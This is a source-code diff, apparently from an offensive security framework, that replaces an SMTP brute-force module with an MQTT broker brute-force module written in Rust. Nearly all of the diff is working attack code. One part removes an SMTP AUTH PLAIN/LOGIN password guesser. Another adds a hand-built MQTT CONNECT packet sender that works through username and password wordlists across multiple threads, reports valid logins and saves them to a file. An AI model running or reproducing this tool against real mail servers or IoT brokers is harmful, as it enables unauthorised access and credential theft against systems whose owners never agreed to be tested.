@@ -8,11 +8,12 @@ use std::path::Path;
 use std::sync::{Arc, Mutex};
 use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
 use std::time::{Duration, Instant};
-use telnet::{Telnet, Event};
 use threadpool::ThreadPool;
 use crossbeam_channel::unbounded;
 
 const PROGRESS_INTERVAL_SECS: u64 = 2;
+const MQTT_CONNECT_TIMEOUT_MS: u64 = 3000;
+const MQTT_READ_TIMEOUT_MS: u64 = 2000;
 
 struct Statistics {
     total_attempts: AtomicU64,
@@ -86,14 +87,14 @@ impl Statistics {
 
 fn display_banner() {
     println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
-    println!("{}", "║   SMTP Brute Force Module                                 ║".cyan());
-    println!("{}", "║   Supports AUTH PLAIN and AUTH LOGIN                      ║".cyan());
+    println!("{}", "║   MQTT Brute Force Module                              ║".cyan());
+    println!("{}", "║   Tests MQTT broker authentication                     ║".cyan());
     println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
     println!();
 }
 
 #[derive(Clone)]
-struct SmtpBruteforceConfig {
+struct MqttBruteforceConfig {
     target: String,
     port: u16,
     username_wordlist: String,
@@ -102,20 +103,23 @@ struct SmtpBruteforceConfig {
     stop_on_success: bool,
     verbose: bool,
     full_combo: bool,
+    client_id: String,
 }
 
 pub async fn run(target: &str) -> Result<()> {
     display_banner();
     println!("{}", format!("[*] Target: {}", target).cyan());
     println!();
-    let port = prompt_port(25);
+    let port = prompt_port(1883);
     let username_wordlist = prompt_wordlist("Username wordlist file: ")?;
     let password_wordlist = prompt_wordlist("Password wordlist file: ")?;
     let threads = prompt_threads(8);
     let stop_on_success = prompt_yes_no("Stop on first valid login?", true);
     let full_combo = prompt_yes_no("Try every username with every password?", false);
     let verbose = prompt_yes_no("Verbose mode?", false);
-    let config = SmtpBruteforceConfig {
+    let client_id = prompt_default("MQTT Client ID", "rustsploit_client");
+    
+    let config = MqttBruteforceConfig {
         target: target.to_string(),
         port,
         username_wordlist,
@@ -124,11 +128,12 @@ pub async fn run(target: &str) -> Result<()> {
         stop_on_success,
         verbose,
         full_combo,
+        client_id,
     };
-    run_smtp_bruteforce(config)
+    run_mqtt_bruteforce(config)
 }
 
-fn run_smtp_bruteforce(config: SmtpBruteforceConfig) -> Result<()> {
+fn run_mqtt_bruteforce(config: MqttBruteforceConfig) -> Result<()> {
     let addr = normalize_target(&config.target, config.port)?;
     let usernames = read_lines(&config.username_wordlist)?;
     let passwords = read_lines(&config.password_wordlist)?;
@@ -153,13 +158,23 @@ fn run_smtp_bruteforce(config: SmtpBruteforceConfig) -> Result<()> {
     let pool = ThreadPool::new(config.threads);
     let (tx, rx) = unbounded();
     if config.full_combo {
-        for u in &usernames { for p in &passwords { tx.send((u.clone(), p.clone()))?; } }
+        for u in &usernames { 
+            for p in &passwords { 
+                tx.send((u.clone(), p.clone())).map_err(|e| anyhow!("Channel send error: {}", e))?; 
+            } 
+        }
     } else if usernames.len() == 1 {
-        for p in &passwords { tx.send((usernames[0].clone(), p.clone()))?; }
+        for p in &passwords { 
+            tx.send((usernames[0].clone(), p.clone())).map_err(|e| anyhow!("Channel send error: {}", e))?; 
+        }
     } else if passwords.len() == 1 {
-        for u in &usernames { tx.send((u.clone(), passwords[0].clone()))?; }
+        for u in &usernames { 
+            tx.send((u.clone(), passwords[0].clone())).map_err(|e| anyhow!("Channel send error: {}", e))?; 
+        }
     } else {
-        for p in &passwords { tx.send((usernames[0].clone(), p.clone()))?; }
+        for p in &passwords { 
+            tx.send((usernames[0].clone(), p.clone())).map_err(|e| anyhow!("Channel send error: {}", e))?; 
+        }
     }
     drop(tx);
     
@@ -183,14 +198,18 @@ fn run_smtp_bruteforce(config: SmtpBruteforceConfig) -> Result<()> {
         let config = config.clone();
         pool.execute(move || {
             while let Ok((user, pass)) = rx.recv() {
-                if stop_flag.load(Ordering::Relaxed) { break; }
-                match try_smtp_login(&addr, &user, &pass) {
+                if stop_flag.load(Ordering::Relaxed) { 
+                    break; 
+                }
+                match try_mqtt_login(&addr, &user, &pass, &config.client_id) {
                     Ok(true) => {
                         println!("\r{}", format!("[+] VALID: {}:{}", user, pass).green().bold());
-                        let mut creds = found.lock().unwrap(); creds.push((user.clone(), pass.clone()));
+                        let mut creds = found.lock().unwrap(); 
+                        creds.push((user.clone(), pass.clone()));
                         stats.record_attempt(true, false);
                         if config.stop_on_success {
                             stop_flag.store(true, Ordering::Relaxed);
+                            // Drain remaining items from channel
                             while rx.try_recv().is_ok() {}
                             break;
                         }
@@ -229,12 +248,14 @@ fn run_smtp_bruteforce(config: SmtpBruteforceConfig) -> Result<()> {
         println!("{}", "[-] No valid credentials found.".yellow());
     } else {
         println!("{}", format!("[+] Found {} valid credential(s):", found_guard.len()).green().bold());
-        for (u,p) in found_guard.iter() { println!("  {}  {}:{}", "✓".green(), u, p); }
+        for (u, p) in found_guard.iter() { 
+            println!("  {}  {}:{}", "✓".green(), u, p); 
+        }
         if prompt("\nSave found credentials? (y/n): ").trim().eq_ignore_ascii_case("y") {
             let f = prompt("What should the valid results be saved as?: ");
             if !f.trim().is_empty() {
                 save_results(&f, &found_guard)?;
-            println!("{}", format!("[+] Results saved to {}", f).green());
+                println!("{}", format!("[+] Results saved to {}", f).green());
             } else {
                 println!("{}", "[-] Filename cannot be empty. Skipping save.".yellow());
             }
@@ -247,7 +268,7 @@ fn run_smtp_bruteforce(config: SmtpBruteforceConfig) -> Result<()> {
         println!(
             "{}",
             format!(
-                "[?] Collected {} unknown/errored SMTP responses.",
+                "[?] Collected {} unknown/errored MQTT responses.",
                 unknown_guard.len()
             )
             .yellow()
@@ -257,7 +278,7 @@ fn run_smtp_bruteforce(config: SmtpBruteforceConfig) -> Result<()> {
             .trim()
             .eq_ignore_ascii_case("y")
         {
-            let default_name = "smtp_bruteforce_unknown.txt";
+            let default_name = "mqtt_bruteforce_unknown.txt";
             let fname = prompt(&format!(
                 "What should the unknown results be saved as? [{}]: ",
                 default_name
@@ -267,7 +288,7 @@ fn run_smtp_bruteforce(config: SmtpBruteforceConfig) -> Result<()> {
             } else {
                 fname.trim().to_string()
             };
-            if let Err(e) = save_unknown_smtp(&chosen, &unknown_guard) {
+            if let Err(e) = save_unknown_mqtt(&chosen, &unknown_guard) {
                 println!("{}", format!("[!] Failed to save unknown responses: {}", e).red());
             } else {
                 println!("{}", format!("[+] Unknown responses saved to {}", chosen).green());
@@ -278,115 +299,180 @@ fn run_smtp_bruteforce(config: SmtpBruteforceConfig) -> Result<()> {
     Ok(())
 }
 
-/// Try login with both AUTH PLAIN and AUTH LOGIN, returns Ok(true) if success, Ok(false) if auth fail, Err on connection/protocol error.
-fn try_smtp_login(addr: &str, username: &str, password: &str) -> Result<bool> {
-    use base64::{engine::general_purpose, Engine as _};
-    let socket = addr.to_socket_addrs()?.next().ok_or_else(|| anyhow::anyhow!("Could not resolve address"))?;
-    let stream = TcpStream::connect_timeout(&socket, Duration::from_millis(1500)).context("Connect timeout")?;
-    stream.set_read_timeout(Some(Duration::from_millis(1500))).ok();
-    stream.set_write_timeout(Some(Duration::from_millis(1500))).ok();
-    let mut telnet = Telnet::from_stream(Box::new(stream), 256);
-    let mut banner_ok = false;
-    for _ in 0..3 {
-        let event = telnet.read().context("Banner read error")?;
-        if let Event::Data(b) = event {
-            let s = String::from_utf8_lossy(&b);
-            if s.starts_with("220") { banner_ok = true; break; }
+/// Try MQTT CONNECT with username/password
+/// Returns Ok(true) if connection accepted, Ok(false) if auth failed, Err on connection/protocol error
+fn try_mqtt_login(addr: &str, username: &str, password: &str, client_id: &str) -> Result<bool> {
+    let socket = addr.to_socket_addrs()?
+        .next()
+        .ok_or_else(|| anyhow!("Could not resolve address"))?;
+    
+    let mut stream = TcpStream::connect_timeout(
+        &socket, 
+        Duration::from_millis(MQTT_CONNECT_TIMEOUT_MS)
+    )
+    .context("Connection timeout")?;
+    
+    stream.set_read_timeout(Some(Duration::from_millis(MQTT_READ_TIMEOUT_MS)))
+        .map_err(|e| anyhow!("Failed to set read timeout: {}", e))?;
+    stream.set_write_timeout(Some(Duration::from_millis(MQTT_READ_TIMEOUT_MS)))
+        .map_err(|e| anyhow!("Failed to set write timeout: {}", e))?;
+    
+    // Build MQTT CONNECT packet
+    let mut packet = Vec::new();
+    
+    // Fixed header: CONNECT (0x10), remaining length will be set later
+    packet.push(0x10); // CONNECT packet type
+    
+    // Variable header: Protocol name + version + flags + keep alive
+    let protocol_name = b"MQTT";
+    let protocol_level = 0x04; // MQTT 3.1.1
+    
+    // Username flag (bit 7) and Password flag (bit 6) in connect flags
+    let connect_flags = 0xC0; // 0b11000000 = username + password flags set
+    let keep_alive: u16 = 60; // 60 seconds
+    
+    // Calculate variable header length
+    let mut var_header = Vec::new();
+    var_header.extend_from_slice(&(protocol_name.len() as u16).to_be_bytes());
+    var_header.extend_from_slice(protocol_name);
+    var_header.push(protocol_level);
+    var_header.push(connect_flags);
+    var_header.extend_from_slice(&keep_alive.to_be_bytes());
+    
+    // Payload: Client ID, Username, Password
+    let mut payload = Vec::new();
+    
+    // Client ID (UTF-8 string, 2 bytes length + data)
+    let client_id_bytes = client_id.as_bytes();
+    payload.extend_from_slice(&(client_id_bytes.len() as u16).to_be_bytes());
+    payload.extend_from_slice(client_id_bytes);
+    
+    // Username (UTF-8 string, 2 bytes length + data)
+    let username_bytes = username.as_bytes();
+    payload.extend_from_slice(&(username_bytes.len() as u16).to_be_bytes());
+    payload.extend_from_slice(username_bytes);
+    
+    // Password (UTF-8 string, 2 bytes length + data)
+    let password_bytes = password.as_bytes();
+    payload.extend_from_slice(&(password_bytes.len() as u16).to_be_bytes());
+    payload.extend_from_slice(password_bytes);
+    
+    // Calculate remaining length (variable header + payload)
+    let remaining_length = var_header.len() + payload.len();
+    
+    // Encode remaining length (MQTT variable length encoding)
+    let mut remaining_length_bytes = Vec::new();
+    let mut x = remaining_length;
+    loop {
+        let mut byte = (x % 128) as u8;
+        x /= 128;
+        if x > 0 {
+            byte |= 0x80;
+        }
+        remaining_length_bytes.push(byte);
+        if x == 0 {
+            break;
         }
     }
-    if !banner_ok { return Err(anyhow::anyhow!("No 220 banner")); }
-    telnet.write(b"EHLO scanner\r\n")?;
-    let mut login_ok = false;
-    let mut plain_ok = false;
-    let mut ehlo_seen = false;
-    let mut buf = String::new();
-    for _ in 0..6 {
-        let event = telnet.read()?;
-        if let Event::Data(b) = event {
-            let s = String::from_utf8_lossy(&b);
-            buf.push_str(&s);
-            if s.contains("AUTH") && s.contains("PLAIN") { plain_ok = true; }
-            if s.contains("AUTH") && s.contains("LOGIN") { login_ok = true; }
-            if s.starts_with("250 ") { ehlo_seen = true; break; }
-        }
+    
+    // Build complete packet
+    packet.extend_from_slice(&remaining_length_bytes);
+    packet.extend_from_slice(&var_header);
+    packet.extend_from_slice(&payload);
+    
+    // Send CONNECT packet
+    use std::io::Write;
+    stream.write_all(&packet)
+        .context("Failed to send CONNECT packet")?;
+    stream.flush()
+        .context("Failed to flush CONNECT packet")?;
+    
+    // Read CONNACK response
+    use std::io::Read;
+    let mut response = [0u8; 4];
+    let n = stream.read(&mut response)
+        .context("Failed to read CONNACK response")?;
+    
+    if n < 2 {
+        return Err(anyhow!("CONNACK response too short"));
     }
-    if !ehlo_seen { return Ok(false); }
-    // Try AUTH PLAIN
-    if plain_ok {
-        let mut blob = vec![0];
-        blob.extend(username.as_bytes()); blob.push(0); blob.extend(password.as_bytes());
-        let cmd = format!("AUTH PLAIN {}\r\n", general_purpose::STANDARD.encode(&blob));
-        telnet.write(cmd.as_bytes())?;
-        for _ in 0..2 {
-            let event = telnet.read()?;
-            if let Event::Data(b) = event {
-                let s = String::from_utf8_lossy(&b);
-                if s.starts_with("235") { telnet.write(b"QUIT\r\n").ok(); return Ok(true); }
-                if s.starts_with("535") || s.starts_with("5") { break; }
-            }
-        }
+    
+    // Check packet type (should be 0x20 = CONNACK)
+    if response[0] != 0x20 {
+        return Err(anyhow!("Expected CONNACK (0x20), got 0x{:02x}", response[0]));
     }
-    // Try AUTH LOGIN
-    if login_ok {
-        telnet.write(b"AUTH LOGIN\r\n")?;
-        let mut expect_user = false;
-        for _ in 0..2 {
-            let event = telnet.read()?;
-            if let Event::Data(b) = event {
-                let s = String::from_utf8_lossy(&b);
-                if s.starts_with("334") { expect_user = true; break; }
+    
+    // Check return code (byte 3 in variable header)
+    if n >= 4 {
+        let return_code = response[3];
+        match return_code {
+            0x00 => {
+                // Success - send DISCONNECT and return true
+                let disconnect = vec![0xE0, 0x00]; // DISCONNECT packet
+                stream.write_all(&disconnect).ok();
+                stream.flush().ok();
+                return Ok(true);
+            }
+            0x04 => {
+                // Bad username or password
+                return Ok(false);
+            }
+            0x05 => {
+                // Not authorized
+                return Ok(false);
+            }
+            _ => {
+                return Err(anyhow!("CONNACK return code: 0x{:02x}", return_code));
             }
         }
-        if !expect_user { return Ok(false); }
-        let ucmd = format!("{}\r\n", general_purpose::STANDARD.encode(username.as_bytes()));
-        telnet.write(ucmd.as_bytes())?;
-        let mut expect_pass = false;
-        for _ in 0..2 {
-            let event = telnet.read()?;
-            if let Event::Data(b) = event {
-                let s = String::from_utf8_lossy(&b);
-                if s.starts_with("334") { expect_pass = true; break; }
-            }
-        }
-        if !expect_pass { return Ok(false); }
-        let pcmd = format!("{}\r\n", general_purpose::STANDARD.encode(password.as_bytes()));
-        telnet.write(pcmd.as_bytes())?;
-        for _ in 0..2 {
-            let event = telnet.read()?;
-            if let Event::Data(b) = event {
-                let s = String::from_utf8_lossy(&b);
-                if s.starts_with("235") { telnet.write(b"QUIT\r\n").ok(); return Ok(true); }
-                if s.starts_with("535") || s.starts_with("5") { break; }
-            }
-        }
+    } else {
+        // If we didn't get enough bytes, assume failure
+        return Ok(false);
     }
-    Ok(false)
 }
 
 fn read_lines(path: &str) -> Result<Vec<String>> {
-    let file = File::open(path).context(format!("Open: {}", path))?;
-    Ok(BufReader::new(file).lines().filter_map(Result::ok).filter(|s|!s.trim().is_empty()).collect())
+    let file = File::open(path)
+        .context(format!("Failed to open file: {}", path))?;
+    Ok(BufReader::new(file)
+        .lines()
+        .filter_map(Result::ok)
+        .filter(|s| !s.trim().is_empty())
+        .collect())
 }
 
 fn save_results(path: &str, creds: &[(String, String)]) -> Result<()> {
-    let mut file = OpenOptions::new().create(true).write(true).truncate(true).open(path)?;
-    for (u,p) in creds { writeln!(file, "{}:{}", u, p)?; }
-    Ok(())
-}
-
-fn save_unknown_smtp(path: &str, entries: &[(String, String, String)]) -> Result<()> {
     let mut file = OpenOptions::new()
         .create(true)
         .write(true)
         .truncate(true)
-        .open(path)?;
+        .open(path)
+        .context(format!("Failed to create file: {}", path))?;
+    for (u, p) in creds { 
+        writeln!(file, "{}:{}", u, p)
+            .context(format!("Failed to write to file: {}", path))?; 
+    }
+    Ok(())
+}
 
-    writeln!(file, "# SMTP Bruteforce Unknown/Errored Responses")?;
-    writeln!(file, "# Format: username:password - error/response")?;
-    writeln!(file)?;
+fn save_unknown_mqtt(path: &str, entries: &[(String, String, String)]) -> Result<()> {
+    let mut file = OpenOptions::new()
+        .create(true)
+        .write(true)
+        .truncate(true)
+        .open(path)
+        .context(format!("Failed to create file: {}", path))?;
+
+    writeln!(file, "# MQTT Bruteforce Unknown/Errored Responses")
+        .context(format!("Failed to write to file: {}", path))?;
+    writeln!(file, "# Format: username:password - error/response")
+        .context(format!("Failed to write to file: {}", path))?;
+    writeln!(file)
+        .context(format!("Failed to write to file: {}", path))?;
 
     for (user, pass, msg) in entries {
-        writeln!(file, "{}:{} - {}", user, pass, msg)?;
+        writeln!(file, "{}:{} - {}", user, pass, msg)
+            .context(format!("Failed to write to file: {}", path))?;
     }
 
     Ok(())
@@ -404,6 +490,15 @@ fn prompt(msg: &str) -> String {
             eprintln!("[!] Failed to read input: {}", e);
             String::new()
         }
+    }
+}
+
+fn prompt_default(msg: &str, default: &str) -> String {
+    let input = prompt(&format!("{} [{}]: ", msg, default));
+    if input.trim().is_empty() {
+        default.to_string()
+    } else {
+        input.trim().to_string()
     }
 }
 
@@ -471,11 +566,26 @@ fn prompt_wordlist(message: &str) -> Result<String> {
 }
 
 fn normalize_target(host: &str, port: u16) -> Result<String> {
-    let re = Regex::new(r"^\[*([^\]]+?)\]*(?::(\d{1,5}))?$" ).unwrap();
+    let re = Regex::new(r"^\[*([^\]]+?)\]*(?::(\d{1,5}))?$")
+        .map_err(|e| anyhow!("Regex compilation error: {}", e))?;
     let t = host.trim();
-    let cap = re.captures(t).ok_or_else(|| anyhow::anyhow!("Invalid target: {}", host))?;
-    let addr = cap.get(1).unwrap().as_str();
-    let p = cap.get(2).map(|m| m.as_str().parse::<u16>().ok()).flatten().unwrap_or(port);
-    let f = if addr.contains(':') && !addr.starts_with('[') { format!("[{}]:{}", addr, p) } else { format!("{}:{}", addr, p) };
-    if f.to_socket_addrs()?.next().is_none() { Err(anyhow::anyhow!("DNS fail: {}", f)) } else { Ok(f) }
+    let cap = re.captures(t)
+        .ok_or_else(|| anyhow!("Invalid target format: {}", host))?;
+    let addr = cap.get(1)
+        .ok_or_else(|| anyhow!("Invalid target: {}", host))?
+        .as_str();
+    let p = cap.get(2)
+        .map(|m| m.as_str().parse::<u16>().ok())
+        .flatten()
+        .unwrap_or(port);
+    let f = if addr.contains(':') && !addr.starts_with('[') { 
+        format!("[{}]:{}", addr, p) 
+    } else { 
+        format!("{}:{}", addr, p) 
+    };
+    if f.to_socket_addrs()?.next().is_none() { 
+        Err(anyhow!("DNS resolution failed: {}", f)) 
+    } else { 
+        Ok(f) 
+    }
 }
